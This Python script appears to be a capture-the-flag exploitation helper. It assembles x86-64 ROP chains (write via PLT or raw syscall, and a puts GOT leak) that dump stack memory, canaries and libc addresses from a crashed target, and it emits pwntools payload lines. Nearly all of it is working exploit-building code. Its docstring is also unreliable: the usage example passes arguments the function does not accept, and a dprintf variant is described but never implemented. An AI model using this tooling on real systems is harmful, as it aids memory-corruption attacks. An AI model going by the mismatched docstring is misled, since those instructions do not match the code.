#!/usr/bin/env python3
"""auto_reg_dump -- build a ROP chain that exfils stack contents via write(2).

When `gdb` is unavailable (remote-only targets, missing gdbserver, forked
xinetd services), the quickest way to inspect post-ROP register/memory state
is to chain `write(1, rsp, N)` at the crash point and read the bytes back
over the same tube. The captured stack region contains:

  * the canary (if a function prologue stored it)
  * saved rbp / saved retaddr (libc leak when a libc func was just called)
  * callee-saved reg values (r12..r15) from function epilogues
  * arbitrary argv/envp pointers for ret2argv tricks

Typical use (pwn2 post-leak to confirm r12 = 1):

    from auto_reg_dump import build_write_chain
    chain = build_write_chain(
        libc_base=libc_base,
        pop_rdi=0x10f75b,
        pop_rsi_r15=0x110a4d,   # or pop_rsi; ret composite
        write_plt=0x401030,     # binary -- write@plt
        fd=1,
        target_addr=STACK_ADDR, # often the current rsp
        length=0x80,
    )

Four supported variants:

  1. write(fd, rsp, N)      -- dump the current stack window
  2. write(fd, &buf, N)     -- dump a known data region (useful for
                              printing canary out of .bss)
  3. puts(&ptr)              -- one-shot 6-byte libc leak (see the stage-1
                              leak trick from VERE pwn2)
  4. dprintf(1, "%N$p")      -- formatted leak when you already have a
                              format-string primitive

The CLI emits ready-to-paste pwntools snippets.
"""
from __future__ import annotations

import argparse
import sys
import textwrap
from dataclasses import dataclass
from typing import Any


@dataclass
class Gadgets:
    pop_rdi: int = 0
    pop_rsi: int = 0
    pop_rsi_r15: int = 0        # `pop rsi; pop r15; ret`
    pop_rdx: int = 0
    pop_rdx_r12: int = 0        # `pop rdx; pop r12; ret`
    pop_rax: int = 0
    syscall_ret: int = 0
    write_plt: int = 0
    puts_plt: int = 0
    ret: int = 0                # bare `ret` for alignment


def build_write_chain(
    g: Gadgets,
    fd: int,
    target_addr: int,
    length: int,
) -> list[tuple[str, int]]:
    """Return a list of (label, value) pairs for the ROP chain.

    Preferred: ret2plt-style write via PLT (no syscall gadget needed).
    Fallback: syscall-style `mov rax, 1; syscall` via libc gadgets.
    """
    chain: list[tuple[str, int]] = []
    if g.write_plt:
        # write(fd, target_addr, length) via PLT
        chain.append(("pop rdi; ret", g.pop_rdi))
        chain.append(("fd",            fd))
        if g.pop_rsi_r15:
            chain.append(("pop rsi; pop r15; ret", g.pop_rsi_r15))
            chain.append(("target_addr",           target_addr))
            chain.append(("r15 pad",               0))
        elif g.pop_rsi:
            chain.append(("pop rsi; ret", g.pop_rsi))
            chain.append(("target_addr",  target_addr))
        else:
            raise ValueError("need pop rsi gadget (or pop rsi; pop r15; ret)")
        if g.pop_rdx_r12:
            chain.append(("pop rdx; pop r12; ret", g.pop_rdx_r12))
            chain.append(("length",                 length))
            chain.append(("r12 pad",                0))
        elif g.pop_rdx:
            chain.append(("pop rdx; ret", g.pop_rdx))
            chain.append(("length",        length))
        else:
            raise ValueError("need pop rdx gadget (or pop rdx; pop r12; ret)")
        chain.append(("write@plt", g.write_plt))
        return chain

    if not (g.pop_rdi and g.pop_rsi_r15 and g.pop_rdx_r12 and g.pop_rax and g.syscall_ret):
        raise ValueError("syscall fallback needs pop_rax + syscall;ret + rdi/rsi/rdx gadgets")
    # write syscall: rax=1, rdi=fd, rsi=target, rdx=len; syscall
    chain.append(("pop rdi; ret",           g.pop_rdi))
    chain.append(("fd",                      fd))
    chain.append(("pop rsi; pop r15; ret",   g.pop_rsi_r15))
    chain.append(("target_addr",             target_addr))
    chain.append(("r15 pad",                 0))
    chain.append(("pop rdx; pop r12; ret",   g.pop_rdx_r12))
    chain.append(("length",                  length))
    chain.append(("r12 pad",                 0))
    chain.append(("pop rax; ret",            g.pop_rax))
    chain.append(("__NR_write = 1",          1))
    chain.append(("syscall; ret",            g.syscall_ret))
    return chain


def build_puts_leak_chain(g: Gadgets, ptr_addr: int) -> list[tuple[str, int]]:
    """One-shot libc leak: puts(*(char**)ptr_addr).

    If `ptr_addr` holds a GOT entry (e.g., puts@GOT resolved under Full RELRO),
    this prints the libc function's address as a C string. See pwn2 for the
    prototypical use: overflow a global `buf` so buf[0..7] = PUTS_GOT and
    functions[0] = a wrapper that `puts(*(long*)buf)`.
    """
    if not g.puts_plt or not g.pop_rdi:
        raise ValueError("need puts@plt and pop rdi gadgets")
    return [
        ("pop rdi; ret", g.pop_rdi),
        ("ptr_addr",     ptr_addr),
        ("puts@plt",     g.puts_plt),
    ]


def chain_to_pwntools(chain: list[tuple[str, int]]) -> str:
    """Render as a pwntools-friendly snippet."""
    lines = ["payload  = b''"]
    for label, val in chain:
        lines.append(f"payload += p64({hex(val)})  # {label}")
    return "\n".join(lines)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["write", "puts"], default="write")
    ap.add_argument("--fd", type=int, default=1)
    ap.add_argument("--target", type=lambda s: int(s, 0), default=0,
                    help="address to dump from (write mode) or ptr to puts (puts mode)")
    ap.add_argument("--length", type=lambda s: int(s, 0), default=0x80)
    # Gadget offsets (absolute addrs, already resolved by caller):
    ap.add_argument("--pop-rdi",          type=lambda s: int(s, 0), default=0)
    ap.add_argument("--pop-rsi",          type=lambda s: int(s, 0), default=0)
    ap.add_argument("--pop-rsi-r15",      type=lambda s: int(s, 0), default=0)
    ap.add_argument("--pop-rdx",          type=lambda s: int(s, 0), default=0)
    ap.add_argument("--pop-rdx-r12",      type=lambda s: int(s, 0), default=0)
    ap.add_argument("--pop-rax",          type=lambda s: int(s, 0), default=0)
    ap.add_argument("--syscall-ret",      type=lambda s: int(s, 0), default=0)
    ap.add_argument("--write-plt",        type=lambda s: int(s, 0), default=0)
    ap.add_argument("--puts-plt",         type=lambda s: int(s, 0), default=0)
    ap.add_argument("--ret",              type=lambda s: int(s, 0), default=0)
    args = ap.parse_args()

    g = Gadgets(
        pop_rdi=args.pop_rdi, pop_rsi=args.pop_rsi,
        pop_rsi_r15=args.pop_rsi_r15, pop_rdx=args.pop_rdx,
        pop_rdx_r12=args.pop_rdx_r12, pop_rax=args.pop_rax,
        syscall_ret=args.syscall_ret, write_plt=args.write_plt,
        puts_plt=args.puts_plt, ret=args.ret,
    )

    if args.mode == "write":
        chain = build_write_chain(g, args.fd, args.target, args.length)
    else:
        chain = build_puts_leak_chain(g, args.target)

    print(f"# chain length: {len(chain)} slots = {len(chain)*8} bytes")
    print(chain_to_pwntools(chain))
    return 0


if __name__ == "__main__":
    sys.exit(main())
